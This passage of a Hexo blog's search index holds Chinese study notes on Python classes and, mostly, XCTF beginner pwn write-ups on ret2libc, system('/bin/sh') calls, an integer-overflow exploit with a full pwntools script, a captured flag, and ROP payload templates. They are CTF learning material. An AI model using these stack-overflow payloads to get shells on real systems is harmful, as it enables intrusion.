class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> :<br>    def mprint(<span class="hljs-variable language_">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.__class__)<br><br>t = My<span class="hljs-keyword">class</span><br><span class="hljs-title class_">t</span>.mprint()<span class="hljs-meta"></span><br><span class="hljs-meta">#结果为</span><span class="hljs-meta"></span><br><span class="hljs-meta">#&lt;__main__.Test instance at 0x100771878&gt;</span><span class="hljs-meta"></span><br><span class="hljs-meta">#__main__.Test</span><br><br></code></pre></td></tr></table></figure><p>可见self代表的是类的实例。代表当前对象的地址。self.class指向类。<br><strong>self不是关键字，所以self可以换成其他标识符</strong></p><h3 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h3><p>也就是类内函数。<br>但注意，def以后，第一个参数一定是self，self是类的实例，方法内对类元素的操作，用self.element来调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    age = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#以上为公有基本属性。</span><br>    __weight = <span class="hljs-number">0</span> <span class="hljs-comment">#双下划线开头的元素为私有元素，在外界无法访问到。</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w</span>):<br>        self.name = n<br>        self.age = a<br>        self.__weight = w<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.age)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s说：我今年%d岁&quot;</span>%(self.name,self.age))<br><br><span class="hljs-comment">#单继承示例：</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span>(<span class="hljs-title class_ inherited__">people</span>):<br>    grade = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w,g</span>):<br>        people.__init__(self,n,a,w)<span class="hljs-comment">#调用父类的构造函数</span><br>        self.grade = g<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<span class="hljs-comment">#重写父类函数（多态）</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s said that, i am %d years old, and i am in grade %d&quot;</span>%(self.name,self.age,self.grade))<br><br>s = student(<span class="hljs-string">&quot;peter&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">60</span>,<span class="hljs-number">3</span>)<br>s.speak()<br></code></pre></td></tr></table></figure><p><strong>总结：Python的继承，用小括号在类名里面写父类。<br>可以在__init__()内调用父类的构造函数节约工序<br>子类中直接重写父类函数完成多态</strong><br>Python可以多继承：<br>class class1(fa1,fa2….,fan):<br>statement-1<br>.<br>.<br>.<br>.<br>statement-n<br>over<br><strong>多继承时，调用多个父类同时含有的函数时，优先靠左的函数。</strong></p><h3 id="类属性与方法"><a href="#类属性与方法" class="headerlink" title="类属性与方法"></a>类属性与方法</h3><p>类的私有属性/方法：<strong>用下划线开头即可</strong><br>__element1<br>def __method:<br>…</p><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>例如：</p><p>``` python<br>class Vector:<br>    def <strong>init</strong>(self,a,b):<br>        self.a = a<br>        self.b = b</p><div class="code-wrapper"><pre><code class="hljs">def __str__(self):#此处重载的是打印方法，也就是把该类作为字符串打印    return &#39;Vector (%d,%d)&#39;%(self.a,self.b)    def __add__(self,other):    return Vector(self.a+other.a,self.b+other.b)</code></pre></div><p>v1 = Vector(1,1)<br>v2 = Vector(2,10)<br>print(v1+v2)</p>]]></content>
    
    
    
    <tags>
      
      <tag>embrace Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>start</title>
    <link href="/2022/02/23/start/"/>
    <url>/2022/02/23/start/</url>
    
    <content type="html"><![CDATA[<h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test_new_site</title>
    <link href="/2022/02/23/test-new-site/"/>
    <url>/2022/02/23/test-new-site/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/02/23/hello-world/"/>
    <url>/2022/02/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
